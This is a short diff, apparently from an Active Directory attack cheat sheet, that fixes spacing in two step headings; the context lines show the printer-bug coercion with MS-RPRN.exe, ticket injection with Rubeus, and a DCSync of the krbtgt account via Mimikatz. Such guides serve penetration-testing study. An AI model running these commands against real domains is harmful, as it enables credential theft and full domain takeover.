@@ -510,12 +510,12 @@ Link: [MS-RPRN](https://github.com/leechristensen/SpoolSample)
 # Run MS-RPRN.exe to abuse the printer bug
 .\MS-RPRN.exe \\dcorp.corp.corporate.local \\dcorp-appsrv.corp.corporate.local
 ```
-**3.Copy the base64 encoded TGT, remove extra spaces:**
+**3. Copy the base64 encoded TGT, remove extra spaces:**
 ```powershell
 # Use the ticket
 .\Rubeus.exe ptt /ticket:<TGTofCorp>
 ```
-**4.DCSync attack against Corp using the injected ticket:**
+**4. DCSync attack against Corp using the injected ticket:**
 ```powershell
 # Use the ticket
 Invoke-Mimikatz -Command '"lsadump::dcsync /user:corp\krbtgt"'
